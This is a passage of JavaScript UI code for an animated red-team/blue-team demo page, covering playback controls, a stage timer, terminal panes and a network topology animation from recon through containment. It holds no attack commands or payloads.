    this.isPlaying = false;
    const btnPlayPause = document.getElementById('btnDemoPlayPause');
    if (btnPlayPause) btnPlayPause.textContent = '▶ PLAY';

    if (this.timerId) {
      clearInterval(this.timerId);
      this.timerId = null;
    }
  }

  togglePlayPause() {
    if (this.isPlaying) {
      this.pause();
    } else {
      if (this.currentTime >= this.totalDuration) {
        this.currentTime = 0;
      }
      this.start();
    }
  }

  toggleSpeed() {
    if (this.speed === 1) this.speed = 2;
    else if (this.speed === 2) this.speed = 4;
    else this.speed = 1;

    const btnSpeed = document.getElementById('btnDemoSpeed');
    if (btnSpeed) btnSpeed.textContent = `${this.speed}x SPEED`;
  }

  replay() {
    this.currentTime = 0.0;
    this.currentStageIdx = 0;
    this.start();
  }

  jumpToStage(stageIdx) {
    this.currentStageIdx = stageIdx;
    this.currentTime = this.stages[stageIdx].startTime;
    this.renderCurrentState();
  }

  tick() {
    if (!this.isPlaying) return;

    this.currentTime += 0.25 * this.speed;
    if (this.currentTime >= this.totalDuration) {
      this.currentTime = this.totalDuration;
      this.pause();
      sound.victoryChime();
    }

    this.updateStageFromTime();
    this.renderCurrentState();
  }

  updateStageFromTime() {
    for (let i = 0; i < this.stages.length; i++) {
      if (this.currentTime >= this.stages[i].startTime && this.currentTime < this.stages[i].endTime) {
        if (this.currentStageIdx !== i) {
          this.currentStageIdx = i;
          sound.alertBlip();
        }
        return;
      }
    }
    if (this.currentTime >= this.totalDuration) {
      this.currentStageIdx = this.stages.length - 1;
    }
  }

  renderCurrentState() {
    const stage = this.stages[this.currentStageIdx];
    if (!stage) return;

    // 1. Timer Text & Progress Fill
    const timerText = document.getElementById('demoTimerText');
    const fill = document.getElementById('demoProgressFill');

    const curMins = Math.floor(this.currentTime / 60);
    const curSecs = Math.floor(this.currentTime % 60);
    const totMins = Math.floor(this.totalDuration / 60);
    const totSecs = Math.floor(this.totalDuration % 60);

    if (timerText) {
      timerText.textContent = `${String(curMins).padStart(2, '0')}:${String(curSecs).padStart(2, '0')} / ${String(totMins).padStart(2, '0')}:${String(totSecs).padStart(2, '0')}`;
    }

    if (fill) {
      const pct = (this.currentTime / this.totalDuration) * 100;
      fill.style.width = `${pct}%`;
    }

    // 2. Chips Highlighting
    const chips = document.querySelectorAll('.stage-chip');
    chips.forEach((c, idx) => {
      c.classList.remove('active', 'completed');
      if (idx === this.currentStageIdx) {
        c.classList.add('active');
      } else if (idx < this.currentStageIdx) {
        c.classList.add('completed');
      }
    });

    // 3. Stage Info Banner
    const techBadge = document.getElementById('demoTechBadge');
    const stageDesc = document.getElementById('demoStageDesc');
    const topoStatus = document.getElementById('topoStatusText');

    if (techBadge) techBadge.textContent = stage.techId;
    if (stageDesc) stageDesc.textContent = stage.desc;
    if (topoStatus) topoStatus.textContent = stage.statusText;

    // 4. Dual Terminals Output
    const redTerm = document.getElementById('demoRedTerm');
    const blueTerm = document.getElementById('demoBlueTerm');

    if (redTerm) {
      redTerm.textContent = stage.redOutput;
      redTerm.scrollTop = redTerm.scrollHeight;
    }
    if (blueTerm) {
      blueTerm.textContent = stage.blueOutput;
      blueTerm.scrollTop = blueTerm.scrollHeight;
    }

    // 5. Topology Animation Update
    this.updateTopology(this.currentStageIdx);
  }

  updateTopology(stageIdx) {
    const dot = document.getElementById('topoPacketDot');
    const fwPoly = document.getElementById('fwPoly');
    const webRect = document.getElementById('webRect');
    const line1 = document.getElementById('topoLine1');
    const line2 = document.getElementById('topoLine2');
    const line3 = document.getElementById('topoLine3');
    const line4 = document.getElementById('topoLine4');

    if (!dot) return;

    dot.style.display = 'block';

    if (stageIdx === 0) {
      // Recon: Attacker -> FW
      dot.setAttribute('cx', '220');
      dot.setAttribute('cy', '35');
      dot.setAttribute('fill', '#FF1F3D');
      dot.setAttribute('opacity', '1');
      if (line1) line1.setAttribute('stroke', '#FF1F3D');
      if (line2) line2.setAttribute('stroke', '#1E293B');
    } else if (stageIdx === 1) {
      // Foothold: FW -> Web
      dot.setAttribute('cx', '420');
      dot.setAttribute('cy', '35');
      dot.setAttribute('fill', '#FF1F3D');
      dot.setAttribute('opacity', '1');
      if (line1) line1.setAttribute('stroke', '#FF1F3D');
      if (line2) line2.setAttribute('stroke', '#FF1F3D');
      if (webRect) webRect.setAttribute('stroke', '#FF1F3D');
    } else if (stageIdx === 2 || stageIdx === 3) {
      // Discovery & Privesc: Web
      dot.setAttribute('cx', '520');
      dot.setAttribute('cy', '35');
      dot.setAttribute('fill', '#FFE600');
      dot.setAttribute('opacity', '1');
      if (webRect) webRect.setAttribute('stroke', '#FFE600');
    } else if (stageIdx === 4 || stageIdx === 5) {
      // Telemetry & SIEM match: Web -> SIEM
      dot.setAttribute('cx', '700');
      dot.setAttribute('cy', '35');
      dot.setAttribute('fill', '#00E5FF');
      dot.setAttribute('opacity', '1');
      if (line4) line4.setAttribute('stroke', '#00E5FF');
    } else if (stageIdx === 6) {
      // Analyst triage: SIEM -> Web
      dot.setAttribute('cx', '650');
      dot.setAttribute('cy', '35');
      dot.setAttribute('fill', '#00FF6A');
      dot.setAttribute('opacity', '1');
    } else if (stageIdx === 7) {
      // Containment: FW blocks Attacker, drops line1
      dot.setAttribute('opacity', '0');
      if (line1) line1.setAttribute('stroke', '#FF1F3D');
      if (fwPoly) fwPoly.setAttribute('stroke', '#00FF6A');
      if (line2) line2.setAttribute('stroke', '#1E293B');
      if (webRect) webRect.setAttribute('stroke', '#00FF6A');
    }
  }
}

function startWatchController() {
  const watch = new WatchController();
  watch.init();
}

if (document.readyState === 'loading') {
  document.addEventListener('DOMContentLoaded', startWatchController);
} else {
  startWatchController();
}
